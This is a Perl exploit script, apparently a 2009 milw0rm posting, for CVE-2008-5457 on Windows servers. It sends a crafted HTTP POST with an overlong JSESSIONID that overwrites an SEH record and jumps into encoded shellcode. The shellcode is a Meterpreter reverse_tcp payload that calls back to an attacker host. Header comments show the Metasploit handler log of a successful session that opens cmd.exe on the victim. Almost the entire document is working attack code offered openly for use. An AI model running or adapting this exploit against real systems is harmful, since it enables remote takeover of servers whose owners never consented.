#!/usr/bin/perl
# No point in keeping this private anymore!
#
# k`sOSe - 02/16/2009 - CVE-2008-5457
# Tested on w2k sp4 and w2k3 R2 sp2 (no NX)
#
# cohelet framework-3.2 # ./msfcli multi/handler PAYLOAD=windows/reflectivemeterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=80 E
# [*] Please wait while we load the module tree...
# [*] Handler binding to LHOST 0.0.0.0
# [*] Started reverse handler
# [*] Starting the payload handler...
# [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
# [*] Sending stage (75776 bytes)
# [*] Meterpreter session 1 opened (10.10.10.1:80 -> 10.10.10.4:2171)
#
# meterpreter > rev2self
# meterpreter > execute -i -f cmd.exe
# Process 3092 created.
# Channel 1 created.
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# c:\windows\system32\inetsrv>



# LHOST=10.10.10.1 LPORT=80
# windows/reflectivemeterpreter/reverse_tcp
# [*] x86/alpha_mixed succeeded, final size 619                                                                                                                      
my $shellcode = 
"\xd9\xec\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a" .
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" .
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" .
"\x75\x4a\x49\x4b\x4c\x4b\x58\x46\x36\x45\x50\x45\x50\x43" .
"\x30\x50\x53\x46\x35\x51\x46\x51\x47\x4c\x4b\x42\x4c\x47" .
"\x54\x44\x58\x4c\x4b\x50\x45\x47\x4c\x4c\x4b\x51\x44\x43" .
"\x35\x44\x38\x45\x51\x4b\x5a\x4c\x4b\x50\x4a\x45\x48\x4c" .
"\x4b\x51\x4a\x47\x50\x43\x31\x4a\x4b\x4b\x53\x50\x32\x51" .
"\x59\x4c\x4b\x47\x44\x4c\x4b\x45\x51\x4a\x4e\x50\x31\x4b" .
"\x4f\x4b\x4c\x50\x31\x49\x50\x4e\x4c\x47\x48\x4d\x30\x43" .
"\x44\x44\x47\x49\x51\x48\x4f\x44\x4d\x43\x31\x49\x57\x4a" .
"\x4b\x4b\x42\x47\x4b\x43\x4c\x47\x54\x42\x34\x44\x35\x4b" .
"\x51\x4c\x4b\x51\x4a\x47\x54\x45\x51\x4a\x4b\x43\x56\x4c" .
"\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4a\x45\x4c\x45\x51\x4a" .
"\x4b\x4c\x4b\x43\x34\x4c\x4b\x45\x51\x4a\x48\x4a\x4b\x43" .
"\x32\x50\x31\x49\x50\x51\x4f\x51\x4e\x51\x4d\x51\x4b\x48" .
"\x42\x45\x58\x43\x30\x51\x4e\x42\x4a\x46\x50\x51\x49\x43" .
"\x54\x4c\x4b\x42\x39\x4c\x4b\x51\x4b\x44\x4c\x4c\x4b\x51" .
"\x4b\x45\x4c\x4c\x4b\x45\x4b\x4c\x4b\x51\x4b\x44\x48\x51" .
"\x43\x45\x38\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x4b\x4f\x4e" .
"\x36\x4d\x59\x48\x47\x46\x33\x45\x38\x46\x34\x48\x4a\x4e" .
"\x4f\x4c\x51\x4b\x4f\x49\x46\x4d\x51\x4a\x4c\x45\x50\x43" .
"\x31\x43\x30\x45\x50\x50\x50\x46\x37\x46\x36\x51\x43\x4d" .
"\x59\x4d\x35\x4d\x38\x45\x4f\x43\x30\x45\x50\x43\x30\x4a" .
"\x30\x43\x31\x43\x30\x45\x50\x48\x36\x45\x49\x42\x38\x4d" .
"\x37\x49\x34\x42\x39\x42\x50\x4d\x39\x4a\x4c\x4c\x39\x4e" .
"\x4a\x43\x50\x48\x59\x45\x59\x4a\x55\x4e\x4d\x48\x4b\x4a" .
"\x4d\x4b\x4c\x47\x4b\x51\x47\x50\x53\x46\x52\x51\x4f\x46" .
"\x53\x46\x52\x45\x50\x51\x4b\x4c\x4d\x50\x4b\x42\x38\x46" .
"\x31\x4b\x4f\x48\x57\x4b\x39\x49\x4f\x4b\x39\x48\x43\x4c" .
"\x4d\x44\x35\x44\x54\x43\x5a\x45\x55\x50\x59\x46\x31\x46" .
"\x33\x4b\x4f\x46\x54\x4c\x4f\x4b\x4f\x50\x55\x44\x44\x51" .
"\x49\x4c\x49\x44\x44\x4c\x4e\x4b\x52\x4b\x42\x46\x4b\x47" .
"\x57\x50\x54\x4b\x4f\x50\x37\x4b\x4f\x46\x35\x51\x38\x46" .
"\x51\x49\x50\x50\x50\x46\x30\x46\x30\x46\x30\x47\x30\x46" .
"\x30\x47\x30\x50\x50\x4b\x4f\x51\x45\x51\x34\x4b\x39\x48" .
"\x47\x45\x38\x44\x4a\x45\x5a\x44\x4a\x45\x51\x43\x58\x44" .
"\x42\x45\x50\x45\x50\x46\x30\x4b\x39\x4d\x31\x43\x5a\x42" .
"\x30\x46\x31\x51\x47\x4b\x4f\x50\x55\x51\x30\x43\x5a\x51" .
"\x50\x51\x4e\x46\x36\x49\x51\x4a\x46\x45\x56\x51\x46\x49" .
"\x51\x4a\x46\x44\x48\x46\x36\x43\x5a\x45\x50\x4b\x4f\x46" .
"\x35\x44\x4c\x4d\x59\x49\x53\x42\x4a\x43\x30\x50\x56\x51" .
"\x43\x50\x57\x4b\x4f\x46\x35\x44\x58\x4b\x4f\x48\x53\x44" .
"\x4a\x41\x41";


use warnings;
use strict;
use IO::Socket::INET;

my $sock = IO::Socket::INET->new(PeerAddr => '10.10.10.4', PeerPort => '80', Proto => 'tcp');

print $sock	"POST /index.jsp?;JSESSIONID=" . 
		"B" x 5132 . 
		$shellcode .
		"C" x (3000-length($shellcode)) .
		"\xe9\x43\xf4\xff\xff" .	# jmp back
		"\x90\x90\xeb\xf7" .		# jmp back
		"\x76\x79" .			# SEH partial rewrite 
		" HTTP/1.0\r\n" .
		"Connection:Keep-Alive\r\n" .
		"Content-Length: 81\r\n\r\n" . "A" x 81 . "\r\n";

# milw0rm.com [2009-04-01]
